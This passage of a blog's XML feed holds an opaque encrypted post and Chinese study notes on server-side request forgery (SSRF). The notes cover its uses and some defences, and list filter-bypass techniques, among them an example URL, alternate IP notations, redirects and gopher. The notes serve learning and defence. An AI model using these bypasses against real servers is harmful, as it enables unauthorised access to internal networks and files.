a0ce0b423513f4e368ed0fc4296b27d908281fde89b0b4a7e0405de0b11b9881129d5f82d68dbc4d35a3b8399c1861ab7152896518559f3cb1acfba0de743bb6e9896cf8feacb687af326f64a6feb7ea2f995dba36db46bcc578e641f6a31cec078ead99c393b03b6302eefeee8971a52c34f17cc4d70cee2977b3a06bbc2aec8f3ff7560b777b6d2cb89c4368c6323bae719d7d972582526b084720df9aea4696b29b0cc6c83a71582ddb207d86e1178d4415b8e65a66d7e506ef01ce519af3854b8adb66f5a7e406ea368ebfc3575b2b1cfbea771753d588a2d846a009a1dc4d6a64f32574fb572a299d496fb5c34e0398f361877cd3a36ba70ed71f422679f039909ece57d66f22a54719fb33accff264ac198888eb0ec05dc6fff8af786ea13ab009fc8f425d727d526268d6252dbad1525d8000193d379bf9ff6b4e0bfd216993af87f8f2be02e5272574bcb4da790c59a3af917c6e4a734308079af378e2fc99ef8249a478d984b53264e8b84bd04f1f943708336e6644046e9f4c2c9e81d1f3ecd4733fdc6ccbb0d8448959250ef7d2508173b3724c7e292e3b50b96564e66511a8bd47d49f6ed5085d41c0eb45ed08aa6b777a8760e4f1651e843d44e157a9d1bb17fd49700b16165b92bbd32d386c56cf4f63da0a01ccb109ee93a9e8b2be19f7439a203d6415a5d2b2c29f33834691c0642dc6b7f9b3be4b4c2fb29b1bc8ccb1881c15114032ee02d4bab2065d1ca77ac12019af847804c90f6bc7e877094248ee74fcbcb5da44a727ddf40f57df3f34666491aa05087b507eaee8c14e9d6e9ac122fd22e5565a789d177e374d1344e80cabe8da01eb980af5cb61d5aae36e6a27467340eb6df131fc64c00d25d1a7d761a80d6eef4eb91f39afe13ad33f56ffdceccf49cfe864033855b4746c66c3f4f3c45a436a42a075681ce3e806d92370aded2d181e93b87b67ac612e183ec0f6d4412ff5c0ea8e7d4765538a639d516d74552d04f1d0f89225ca8acc4edc8f708556e60f7effec40004726c615821cebc483d88b91681dd450eb7fcfb195b15898804b60ac44d13f97245ce3662470f629d89d7414004e237675ccbfd831027dbae5a31efe0160289d70089d2cb95062895f45cb6bdb5b4b6198d947ae0803c7cf3cab9ce9dafedfd8d841eaedc16a33978ad2ca78b387b32cc2990b0134eed2c6cc1319c1577017588e9c4aa7ff9c0f7f698897533b5fffae7ec0b194742c5136d33ae2b3e2e5a89d2fe3f2d5aced3fe16bc34d810e1a08e5ad50546c999802910a19ae719af9509ba16cf40ed0018e96a9cd902c3a73f2d6990d25ef71e4f9f97915a992a0bd8767f85e8216622293b0999b542317cc261bbe358ee39ae66adf2e4ba2947166ea4dd649dc244f2ae0038514b95689a2c0df34723241d25aa848a2bde5d21861b97f110de90527b37e9a54f5ccceef24acc7601f2e4da7e9b3476515b2aae2b7f83d61e7bd17b323ca43ff6b77e057522d92d2921fcc8c8807da531897a827f80ace12603170e6cb724aa450040f457e6c0fc79cf761aa4615ebec31ddd62cef7bbfa9165e6538013145c0e726bf398b7988997533c6002848e456e4a1dabbc112cd438b3eae82a4d879e6e65c4aeac8bdf11e3a0dd5e7063202913e85e98ae0417771f11bef2dbaeee09ffa24597f7ff8e1c0a65e7ff517c6195b13314dae6e63326495e8fe80663850343b11a09d37fd279e9f807aee4f5ceca3cb683da7e8c92f5731a1c8bdc56fae96cdd9e570314a9727d3a9bf08e0dceea8ad7ee7c87e085739741988aede3b87357fc4f2803133a936f48e2f5f5f4daeccd2a8f5d8e6694b357b278c41c1e793f68ceea016cf37a09eb5ff762c4886c9c7175e9b43ce1874d0aaab285959aff42a2b8f5055d639a8bbd9f18b44e47e5a9d542a22e1762b30525dcc363a0ad779b41f315a888487c2c8d77e32ec4431f5a7303777e4ed8a6e94956335c27cf4ad8bf85faf387ea6eeca274783c20b5c2b069bc31f8323ee53391bf702ca25f9ca56141105831a2240478af6f56040e9a1d981dd41e2711c83bbb8dc50874705afe3a530debee216beb41d22496f040fb1fdbc286ec7a32d1687b4c6976ee2607991ed390d4eeb74328edb4276d29cdbb0c128e6095903d93319f87dfffc9d1daa9f66378ce6a28316330c2f34aa582681336f34529deaa2afc021531f8178699403fb71a52758f3f0c7012700a4658bf8e3391c54f87565dff31ebe253005f69e3f9cba4c01b4f0992f9f323fa5878910606d6145d1e27aa36e1ccd619e489e6649b1c7b3ac0cfaa2e26512e8c0d66f80aa62ff031dfe16e2a5c8cbbfacbf07bfd6a0671d6f6b63ff33cd791aae35736d1dbdcc75d9a1b49a0a186f50dbca18ed5c1384f20b62cfe8055d39039fc6f8c49c9ab9fbaf84008f56f5ef7a6218c8eb3d3095de2a0bd751b94d4e715976673270e84c074b347075d80bec03e0ac449d075f5b79b864f439ec41b9a4ae5f034e29b152b29c314ebf529049ee5a64b6a9e212b8a4bd82a552514a906ba51196f0bce07784bb34a8b0d1fe92d014051dd57347ecbab4e840164ed96e5821d613c1bbe0917e3fecdd2fe8d3ee1e3747631900f763290f809a6f4a97dfead603023621937cbc959b9c87d1b036f42de1a93ae2d1942701a2ed30bbb3e6d1e0ee9d15482377b2984ab6184c13354ef9b4a274bad318c28cf6cd97047a320a05bcde113127ecc321c386689340946a7584bcdccf76369536379e884f183dacbb13ad2200304888458349e0f1d9b7533afdcf57587d8da09f6142d28723efbeb8676b400e23f8c8e38b9a5133404a1a43fe29b9b4cd6c2c7feb3f683449a9b4fab69516769e6f81646f15a325f2679c6efebbbb11dc7af631183147ddf2f279298968de66c5f82a608dd71f588434acc26e81c2636cfaf0ae20cc9c916ca166052ea69645897f5b2bc3e9ef3f350012016442535c4b11787263b4cac2b3c8f5b121b704c4eebdd626a70558eb736062c1aad0b378460a043eb9a159394c7b06c54b67819becb5cf66cbca8f8b70e8699d7bdfcf4e7d55902bbe40d8ba96f674170a557c1ec729cbd0613d9ba0a421d0d8931d7214676b3df68685c5dbf2997160c11b08ef45c02591505e1d36aec8cc4e6261e536c60977b68f3f57dc1ef7cbf1e63aa54555409ed25c41d7ac4cd58ec63288cfb517bc6786d182c4b42eb81acc8679baf54195f1ad8b6f2a89cc01e12ff46f0927a8d8e4bf76a95c946f07a5971011218795ec2fa52c396cb51634a8dfd4be671707245ea891aea93e46f83dfa1dcec9f7de066e0ec15f492ec09912ce236e9f8389a75fa2d14b1333f46b37ca7a8c840db61f1d6eab7b2e9b83ae1a18dc86a98f9ffcc56c50bda405a4b89c38cce0802d51c1f904ef053696848c6fa3f6792275ae3b29e8dd3fb867c12cf9bace9a0eb5093a96aeb342e18d407ae8516847f816a1a2f2f0ec45b058cdee4fb42d4e53fcd1d24d067ba3c5720a80437f3b81972003d040e158d9fc04a0edf5b1a6a63f9e65cffb2026e878078c22b3086918a531ca23dc79632f74e3c400f5e7378497a72240b6587cfc0353da01b8264a7672a8534372e5409f74d14bee427d067dbb3976459fac45cde3f400c2323e0bf9fa28927e3afea58cc714dc3cddc6e7aedb73b9a00c4bddc9ba7a4019be7760096c3ad53cfc2e160323eb23c73fd80590d2fea84e2a37bbc672d40eb486a6e62e4c931caa7e5a24c03151bc08c6d0a596da30daa75e656fc46d316f0e393e5fc901baffa29ee583e2384fe75fe9f949c1fc5fd39ab5ca5317b04e2bbf72dc34c9b3c734f114421b1912a3664d1be8c007c264c63808e4335380a102dc8d0e6828560e495959a1cf209d37c578431fe98346cf40632e07456d914c6402e717a7cdc1f53be7236169784902af9bbaf2c817fc3d95052188bbc6b61fc791aa1631ab6107746f395f43a2be6308ad249ceca7766da6ead22fab1f4fa2aa511803cc39252d1cca2f56ef787a84f03fa2c6ee142d86a6eaac614e018851689dce9939b92d4c447cf1352a2d17610ba440f6979349892a615d08b7102a8c6dade7eb2001112fe66a7195e2c05f605653294b88045d08e1d8403f9d5a2a68cd156a2efc06803a206c58facca67933ec067372227df3f21b2557aa78b1549708971f9620e1ff45e018fb81657dc922ccf2f02e7b760930dfdee675cefbb455651cf34f8f580e89a2ddb07ca058d7bc20a51d010acbac4d1a6e2c557a36efc7a9b520d84680714f136b2ea8ab264174733cf967fbae030aa76620ced2a5e1bd96266b0fa9dd161b5aaffdb5a91877cd824f45757066acf32d42ed82045fcbc008ad264d0743c2cb1dc51ea0ff661954f5ddaf99c19db7a58cddc74ad731c08b19447599a3eba8ec750bf3ffdf6441af7f08965657c3d75d9f961cf2da0019dec44de093513019e021a466bf07ba7a46b8c69a2c29c12be74df22b9d42b067c37176424f11e994124563089f45403d4c8a903028a3f2b08a9fbb58e4d3853dd05432725eef16ccb5515e0e5d1bfc63e3224a0cf7dc21a799dc930c9eb640d85109f64e86c5c3d85b2260465d8e0355af8ed125795f4db809996b824e97fbda0ad2a7ee7180e95e2743c717405007b415c3e6841205ed848e5eb8a895b85eb2b67500de72d8b3f52269919c28b1890f0cebdf90c1d6669d353b185dc36f0b5084b6a714f744af6d89758e903be8b896b4fa00461fe97fc4e4c2c66fc9aff6380985b404de155a7c15855ef41ffb7136f3df1e8fa1ae004430abb0f89b14ee80ee19344bcee5328649930dfa0498326d28cb79deeb66e4468b7728f6c18344f932e93e57066e4b8a1e500791592f6103f28e434a2dbe74378b0e8040765c3215c10290671372e78ed245c112dd1bf32814ecebbe1187ff0711423984a2ee5086a3eebb50f03e63fd68eeb7bcbd8361f8e819639836f6b3e5e068193d63c5feb4c1e186a7f9db9c3388d6943b8f5f1fda41b8b0d1adebd3dcc01aa8e9dd635dae80413b725359152236f5e4702933dc0d6ac82c05266b04ac72c8dab3381df356a11e8305684db3e34f4165cafb2442ab61302e051e3f53249901998b18fb457e7b2e072eab811bdbf6700e4420922eb466db5ecbee0d4c45b39f49e8aca8f7f8ba0e8f2ef479b20666acbaa7e96672dfaf3fca1985c7907dbf51d19cdd1affe664c32e93c918dd0f7b523b1abbca7bf2666d0ed964d074ea3fad57ededc0789618cccbb323fa13de724af02aee6d7eda08a78178ec904398309c6b5c636b6b8b7625a4511b3194277b3d7f9d8e82d7096b4babca252eb74ebcceec4dedde586a5c0559add9c777800099f4ba2f89766d8f2b5fb18ccf775ca8e3b156909bb4d22e85c17d1a707f2c51e0672c0beb2dc3b90e639e26e15c80d458b694d1aa017abeb841029a3d85a156036821fade6bcfd18c9edf5626bcf16fb4f102b5e0a8f69c7ef279d1d58ac99a61c4fb5cf374eb1c536c2739c1ea33f7543db320fc7aa4f9a0f13523141fc554f68d2ceeabf40f98dde9c9ee3166b898cdb18245b11cf8217b345ab5798a865ea03f9e12549f02a320869431f6d47240720b3d20284bd87f7a591463ac579fb7f172fdc5159d7cafbf8b8cbb36d44185268cdefecf621f50cae28657e6b9253fa969f0e59bd6fa1e6606f4423c2bc64f3afa5b350568ef187b4851aff051ccd0e7d2b930cbf0d5f90d9b061ad97725fe6e7cc954abfcf18237ca3694b88b4a0acc68583a16652438f01ff8a81e6c6f40cb44af1f710fdda026ba1b524446d115baeee2a26d1fa97cc11f66375f158a0cdbb3b3f0a7ac2cbbdc943efc9f4d1dac80611fa054ae1baa4c9bcc9bf48c07a2371c99f1c317a81206a08c7d4ded712af479179e257291d5816caad09903fd89644c612ff3e3ab66ca5c7b52f59d350444d76229c08b015f3e4094eb4c4535bdaa45b622a05cca9fa3d7fb648f0844971a4bcffce4f2fc466d1ca00c4ebd45dc7ee2daae511ead02376a970d0488f6586df8627a3fa44cbb18a4dce1e271f2c0c787ae3537e826cad92cac2b8562a8a864d28d4f91e8fc0ff8e3b091361896f763447c26a9cbb4283de39204bf7968a703af2e4ad53935b4d92cacd8de44116292feace1e92d512bc5bc0ed0673b41759025c70870f7c29b9cb5c2475e96e5b86a741a7c40ff67aec241ef30fe6482a43d4a05d7e2da84d908d17be8c57c31af9455a6e37e570c7f879b997ab009471fe3a87dfec592a31d06bec3126e1aee338c36907af03e558bb1cbd2569dfd603fe3def224c50706e491a3aac02681c448e1b75f4037b85b86d9972307147419a1a00be4808545cb63ac0044474454abb9351bbc800ea52169404369223c6eaf388d1d8a0d9c6e961f393a4c80e221fa4172bf85815585933d2d0f7b8d07a00d1768ab013950a0ae8656cf94ba61ce7b1521f7dd7f2a87c81289772ea5d757c3c8b88e8a2730feaaf79c7ed679023e17baaf68c756956634f13fbdab12a9872b2d3017041aa883676fd1087c8073afe38605af20684dd691930e4b15f07da3ebf5be7c31e7f0438ba4936a9a92bec2bb10d0500f4ccc98c32f0c98eab4d70e93d64d6988939b922ebaaf5ca912508a5f6f2a1584843a390378ab634501b913a1394a5768d41308f63aa3a3a403250e804747d45461987bb331fb9c8cd5f04934cdcd3aa5aefa4e519d70f2fb6a21c0c927d4551c1e873452504fafd5f1bdc8506536d043f3a05fd4aabf31ec20bca4cd90c44c488378d50983db83d60a359d19e8e49b24829e1e8451795bc2ce213e7a8370abf92152472f03a11041c36aa0794f4e39ef12b308dc62d955f48e6f70ff4d3772288f84ead32a489cea84de5f54564064c0d5723860c7e66089c06a80eba4ccce31ad3ce6d50dcb1637df4a2bd62094905de07c03ac7f6e289c397f409cdc73e97e2b5d0eee896ce893e5fd89c84749e774192d03774fe7dc4b33c29745d6511cff36c58e5ec015ebfd1aee805ced728bc1da1106f0cf16b1baa5cc3ad01b26e171cb294862949be5909933b065ca7a5eb3a0f151c36bffbce692735637fe838f55d4e7c6335d76ef9b297afd8332754b1b1b9951344d8eda64c607f2f60642e806c0902a8eb78e8cd15b16468e47cc1efc2c3851e09fe214598c07db773311f852ae6e045215cf5894d2d8e74dd388a41bc07d33e2f8b1430e6dd3b087899c927212ff5f182da8439692d2b07c4352b38f7c12938a228bbb8475afe7d741ad683fd97dd9242c012aefeb8e74956bd8ae105a7f3c904333057848c59c217c01d80713cc3a2a402e5456aa7705f02ccf196eda330d9f62a636ed4e19702020ca92768177ae2b3d062ca6b40651ae48f406d1f7234fe9d937236d1f6a6175e6254123071c2ac9adbf7236b66c3550b4a0e2e558dbbc7df8b0fc4ad89002c293072622cc4a3688ba39e7f5e68ebc0771ecd1ba046111f2f4446c64d1161cb093bed0a64a2686e297957e9855e3dcd0cc41cff319798418d2c7a1805daeee6029d030e97229bb9a240bfe808bb4a7c0cf2cb5ac681148a9f1bc481e077287736a6f7c7f2d155548192fde0340b6fa13dc4e32d838aca768f7cbc9983d271e4346fb7e7251a3c3bdd031bdb1e7d76c1040afd24b689b92bf8137a7bdbb02c938702e8fade313f0108b55c36059fe879d747063bb2ab303cdeae98c8c25529e6700454f95b3fabfd863e8038dff3c974043b97948c286f3c0c1a11ae0bf8a334a88771ee02e47c280c59ca3665d4d36000389ca43f1f40913284c4c306ac1781cd00db917c77ada46f641befc62dabafba27f71e376e2ddd046d73811e0466ec3cfcf76b5d22b894e8911d8d0e6ab2fe9f453e2a5769c09c92e576ed376fee72d38e5737a30032dff1386f5411dbef5097b35f64d3e879f51651c24cbc64d3c4251442dca055f22ade3f29e48a47e23fd2e2f4c8318fcff226fd5595001317530ecebbab4ea29df4380cba052af416080dd6a0f55543ec5ab47bd4b955dccd46e708174b75f0b9285ccf43bc05ca05441e5e1baf1bf3cbee597551980cd344299c57301a954903ed5c1b93fcc78679e03eb565c4d2f4b64c66154f7f59ac433814261504e498944e4c1f918916963f6e164cdb7789e9cb16a1f4f47c20502d3a07f5797695ce2c839280cf893b7978edd7c5aaeb5e5cf20ad742b3be4bc3143b00b7d823df2a396b7a5586f5aa01abcb8c5deb902d22ce446af33034cca27fa881374e10a25bf418c40c21ff79472727195cea8b9f8b8d4a231e5963f4975df244db01b64f91de1ce21ae42b7c22f46d21712e9d623a3a7be9fb3f2d93edd8fe461b0fdb848457bd33233a74929651870bdff5c2c956db8c69fd1793b8578184084bbf5f8b0a4e01dd7a7abd8c10f5c92823ea1ba6768707827efd504fa4031dc3dccc4c1346f77bb47dd9493808997775493dea7159e5455594ab965002c516d125ffa23a3dcbfa9223e9ddbf2bba1615efb8951e36003554fbfc0242e9370d97352b691f7ab583f164310d958bbce43dcaebeadbcce2c29f5e418ebb46b188237e2c291f2854dcd0fc440bbb8474224b6faa1a04f961cd753d520d955fc0d0ff2d57699e738afed0ea87d307b2d372e3616f2143ec7f9a2609bd79b5b0c6a80c7067d8b3444e73f2912f7921ea620b329d50c9eae01cd3b0845d7aec58db8130d0675cba2fabe294d3350b86a634dd7853601f8ab894c6bf01ff037c0498a0a5faa8bac836f65b2306ffd9d02ead647b098aa4d7a423322cda3bdb70411d3894036bc042e7144a0e39a2e3442b1897d956f23ec751416f90c48f77d634a80f99afb3e6e2f1fb75310583f472a84f9c04cea61c116e088d702e2c4704bd8e3e3aea5ce267e77b84fcda9a16e2400d48b68b0b32820aa9852b5c19b75b505438dfe2c4768b6b8b0e0044f292d7323c1023f982761e2188e8b288f751bdc74408182d906e23b3d2c2f0a6729a8819f7c3772ee304f6c9841f0893957bdf6fba7d085880d3972295a9a0f6adc4cda9a9a85f2c6ac9e28d3b51e990648e36599fe5876e9faba245911fcc19dfc28fe3d2cc880bc89169ffbd0afe897ad3181d84a409812346d2a5c29e68a39fe4dcc7747064b8c2a1f332a183cd6bdcad357cbc56bd00de3b2f1b556589db31d2400838b125d0d4e773ef99ca460ee8082a247c9c10183c5cbe440ba1081fb71b1bf095208c73c42629b5e3beedfecb2dd8f010a84d790e4985760fa32b430fd92a71973ab04ca9c36e4569aca2b9a738f3dc1f6e02e7f1bcdabc020cfd22091c9c1aa486cfd80c07d7d27e25071b5b8d8f1eb1dc7e44083077565c876fd45a1a009e797c072e3200e448002ccfb79d1c2010a68158b9ea5b8a767480e81feaff6a9cf12bdbf87ab229c54dba6c4d8539de4323266d7cdc32858de36755fbb4c947565e4877ab4fb36d419be29c76fc08f5b0c1a4f6d569fa9ccfcd293fa5e02ac6bc0458b15a0c37f87f9eb7da6866cdb0102d22de252128460c3d56464cb22b3a6e19ad25e1c0e84e65499ffb35f2741757c2bf07db15cfa422266b4ada168077070d0d6d2b9e3b1eb638670e8dff7d6cc4314a673cacac1ac81e47c16253b05df0992077fadcb85873949c2670600897b7a6e6822318f883462dff8cbf01b0c3807cd3bf60beb6811cb3177988b6ae689f8827e1f6146df5c4a3287301b3549f65533b5f8cda17bf5367a91d1299fdc507bbd8edf6171bb5ee2078ae7daabd9593e6048cd1862bba6310d656784a5816d6cdcb311081f7bd4c0fb1f5d2edd6d3eed07f977d4f228a005ac48f8a2ddfdbc31a369f69fcec49432b2ee50b70d600c42a97d10bd796a7f4ee6ae312b6dcddabacddd466900fd27d03d414d7f7a41115fcfa4e291ae622c875cee1ac463c72e93ebdcfcdbbdfc7a197f1dedc556aca07c9beda65e0aab875011635e5396baa0d0c790678f2c5eeff1f1a83d0fcb4609344e360c5ff5265cc7dfc107905fe8599cc31ec16e9547be9055ef1f6a4bc6870c83c3ab6de5bf136b53735156cc93b40e8d77b7f096ff3cf4c697b3dfa2ccd474614027df2fb0c5060dee20b3ac703abff4d7e716fee2f56e74272ae66055da0d4f8e9e8b98e32f1cf584d170cfacce8d89df0b31cf0a17745b4e5490ac1ddd093eb14256daee093b7e83bb4e683a928d86ca92701acdcedc3ff93f5796c8a001ada000abedbcb9caf1ac54e34072d77a9016f6055a03c1b5325650f31383a0bb0396644085a4b9b5669d90ab4f65cb51e361d3ee7925629468b8b95a9f2c44aa1c9c4b9018d1c29ea40b3dbcde2230a8f4537db1560bf3b397cd789f06c47be6117840638b33ce5d20d595109db5f058627e6c795777dd26e7ab07413e32dbd226d826170d5ac59223708a710a60ae2a49b981a7a005f3b7cd45d1b23fa556410d9400fd7d284f831a7f8afd67bdadcddb3c39cef23bbdd12d5a1ae2cd8e2141cde7f37a7ac56c80c04e571ed7eef80028fa86ee1e83126def33ffade6b4146c46f43b0bf35cd1084d36fca0e8a5d5b61aa65fb05a8d9775bc8ffb05047b4a2d6be8a97c4831e59095ad41dce85302b68b27aeb8b845929b6e2277e4c6d574322f4a554014319f10cf4a8c2f7c134893abddf366539deff355e83a75a13371418b55f42eacccbe1fdcf1b7bdaa8f38c3ba3d495673ea9d946089f7318a597aa9c73857cf2e50e99c09456aa8fd8f273fb344401fbdda21878cab9ae4b914f4d22dd8d9b2a1ce9fc406458651876e29bd360cc3320ac75864153eacedc7572a374f5a3a7054d5bb8f3be0333a383021abbfb32411b59f3b7b315f81f16280211c532e621d728bde1b61de454c72422b7e0699c12344d28b750b1edff97d4ffca4ab2b67e5254da855ad8f8edde32c0469d2692128e298ee1dc3dec9f42a9d432998c62aa5180e9f4d1a668dc92a83b3685f7615b84954d64d9b466ceb242eae350c14ada648c201aeee00e9cc3b8fce20e8bb75268a3b54683363136241ab06f241cb8f378d8b139ed211638b1fad4b3157330a1f8ef4fdb55d384ae081e1b14832c244af528721436d46260f4bd3201d41c5472fdd1fc4957bbe910af55c5dfe97882c8e52d562d20e1368b4f92ca62f412594a883c6fbf342c6e920301127c4fdbdba8fca6821b141b9e8548768979b6669d70b3e490dda60fc71e6004b3ad4ef5dee8e6441dcf078fcfb6dd7ad003fe5c3824e355741535724eca0926a17051bbcf9cc754f02ce01085675a79cbfdfe574be1a86e670e6034673d3a3bae5ab015c79244fadf2974da9191b206f49b065e41a4f1adafd41958fb234bb9a71aaaf97b6b2453558f1a4d52f3715b06d341d04d846aa0ad2820b1ff52c9baa7dbb1670ded222a3c39482460b86fcf6e266889b0983347da99510cac6b3a3770e1c21b7cd39da447d81bf49ded8a2a991a66e3660e4d53c92e9eb97f8bc7731cc7e67aca2922d4ba2ab95b7fd856e85a78529c24535e69186967a186a73372e0422feeb25618fc38c64bb3937ad3c8c4e0b754abfbf541625206d08af0dae46bdc1d9e73474d6589929a5948f1198a67f4dcd6f1944d7a7bee2d52cae28cff0372949a2bc5c71ae841eb26609160d8cb749c5d70b02f0dc8814e6ffc271dc3dad471c63090244b8b634f74bb6ef810d250a5ed20fd09c145fba0794d89e7b9f00fa6ab9e6869b9dec2cd94478fc2b263eb2d1c77af207638b48250c68c882ee5434a93728885ade2cb9e447511cee742e73a8a248c066554f4cfb687a9f789df7d248daabc3b83401ee06fa9937ec6d7cb9bdf347263babcde8facd8220940bd333b8b51b66e9dbb074fcbca9081986dda46615e8a73a36e7a6bfd051bca1d640fa5e2f2c8cd314342eca8cb982da23121b32dc92e7c7d8f8f86d496104a9db1165b785a89c7a6beca962d8b72306d43167408ffb67101b7f5679879d1b6d4d15c7ee57b22c4e10fd4176a031cc2a3cbafe3a19b54523a24d955fd38afd8db55ecff143a0180e558f8c0b60f0f607c62da137d23fd1a7b72d5ffb623ceae470abe20c903b16fad18e0a80cb09cc37dde01033b7b9b6b20b4ea46f6d63f35499b227cd06e2ae0b502bf8f8cbe9b6f52cf8f9bc534acfbf9d414fdbc15a45ea8956538b5f22b189038b859bf071c9323bf2e335fd072b2c3718eab4125bf8dbdb42baaf2d1b12c3bbae5a32f5fc18e7dd4e4afd032e575037985aae15bafbef6d30707cf5181e368865bb07f80b96f19ce822faaa50542b0f2baff3e0763e58b0925e8072e1bbc4adb175240039598f01cc47a9ae3e12616b53622aee7b0fbca830f74e645d8b6e4ca4e03db2a4c90dd4e61f903889bab63074d2f29b7cdc4dd30a521ff362c422ab889bcfdaea8510af2e5591224a44248be9b460a70fc8bd736e35638983e402e550050d1570dc89dc91f39d1f5b7049f24254b47b4219e2db9cafa1f1c3295b0fdad2dba1e3e38707afa1efaf7bccee10866ae3198b11b2a000c164d1e28ecc6cc9daa3aa94cbeb8209a3038451b938ca30ab8322d6370bf28fe2289b294c8cdef553b7c9a555d1d8e669b216e3b3cb725a4065f8d6377345599782f2be3831c33efb56ae34fc58dbb8d57da38677ffe25dc31ee904ccbb5bac24878e12f6177bdf09a6d7bd30733bc1611b6752787e8cc8a7ff6f0d0b9b1eac4b4dc358e141376b242a1a7efbd1c37e534bd21770791c932f2543141b7b5bac99a7a168ada98bf7ea68ea08ae08b294ef3da7b0584ef97723e3571088434596f7e3b1bb2573d482c6e3a50e2a4a7fc52267b4f8e16618f0f798b5c0fe80cb0abd1553953d1ced07f05ce31e7ca8f526c0219f5f21e3d71cf145113d78b93559a7ce6f75f4019a2d27b49d2b2fb2e59277786ba5e358fb7e9ff4d4175327e449960330331fa3386a94a614ee674c721572782310f52037598497736dc26d6b1ea0ff7fb9c4ba3a95eba8f8c69fa72ab51626bde7819aabc7905d5980e69a661e57ed746fcdae7506b69d011872fee45645699ca06253c4a0c93db60b667a9acfcf0cc02a517353a56c311c5d9354eeb3a26aabfed9bab624a765e93737824a8af24785609a45ddb9e7b798e88652e4681f1c69e30d52c02595edbcf3ec5b09ddbaa2f2e59d3cde20bc4cba566004db8e60e925778cc3642ccb3ba3cc0edc36ff72e40fe9e34ac9a25ae82bd6fa3fd02b67e6f4e83c5f986c48f6fc1cfdc24bec5b4ab4f19794be4486c0719fa64180bd592cc85ed4d4b144d2b102ce3e7eb6f62026024209423c7e109f4b7a626e32034c89acc902c77d312fc4c34f9e2abbd4e45415d575baf47c429b747b9b26e9195ef1f2c43b91206bfc644492b63a0ab33321f32101a93afcf252c40c3f8db36e08fb4815b901582ab39a22091a2fa0e437feb5030797d8e3f13d06523bd55c8d8ef620bfd13a42cd845a0bac2fa1b45eefe8c60dd21bfc5f0c442fbb3dc0ad7d647dc47fbc3547c5026bc146a9708e25ab963e871322221d71f03a7ab0c0c72b3054a3d544edcd58a5070b7d788e654c20e6e26af8aa366027ac6a071e86ab5d558fa8883de2bb2e33e344735ebfdf3b1a5b13056f602709fbd2727d303a0655a3e5c984a6e545f91b55a9b156d8d51b4a2f8d8f9497f2ea5f1eb47e960814e08a3e8876c115465afec902cb74805c38b3e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-知识点</title>
      <link href="/2022/04/23/SSRF-%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/04/23/SSRF-%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p><span id="more"></span><h3 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h3><p>SSRF漏洞形成的原因大多是因为服务端提供了从其他[服务器&#x2F;应用]获取数据的功能,且没有对目标地址作过滤和限制。</p><h3 id="用途："><a href="#用途：" class="headerlink" title="用途："></a>用途：</h3><ol><li>可以对外网、服务器所在内网、本地进行端口扫描 获取一些服务的banner信息</li><li>攻击运行在内网或本地的应用程序 比如溢出</li><li>对内网web应用进行指纹识别 通过访问默认文件实现</li><li>攻击内外网的web应用 主要是使用get参数就可以实现的攻击（比如struts2，sqli等）</li><li>利用file协议读取本地文件等</li></ol><h3 id="绕过和防御："><a href="#绕过和防御：" class="headerlink" title="绕过和防御："></a>绕过和防御：</h3><h4 id="绕过："><a href="#绕过：" class="headerlink" title="绕过："></a>绕过：</h4><ul><li>更改IP地址写法：一些开发者会通过对传过来的 URL 参数进行正则匹配的方式来过滤掉内网 IP但是过滤的不严格，可以将IP地址写成各种进制格式</li><li>利用解析url出现的问题：在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。如 <code>http://www.baidu.com@192.168.0.1/</code></li><li>利用跳转：如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。可以通过短地址的方式来绕过。常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。</li><li>通过各种非HTTP协议：如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。</li><li>利用IDN：一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。例如 ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ 和 example.com 等同。</li></ul><h4 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h4><ul><li>过滤返回的信息</li><li>统一错误信息</li><li>限制请求的端口</li><li>禁止不常用的协议</li><li>对DNS Rebinding，考虑使用DNS缓存或者Host白名单</li><li>可以的话使用地址白名单</li><li>过滤 10.0.0.0&#x2F;8 、172.16.0.0&#x2F;12、192.168.0.0&#x2F;16、localhost 私有地址、IPv6 地址</li><li>内网服务开启鉴权（Memcached, Redis, Elasticsearch and MongoDB）</li><li>需要使用互联网资源（比如贴吧使用网络图片）而无法使用白名单的情况：首先禁用CURLOPT_FOLLOWLOCATION 然后通过域名获取目标ip，并过滤内部 ip；最后识别返回的内容是否与假定内容一致</li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
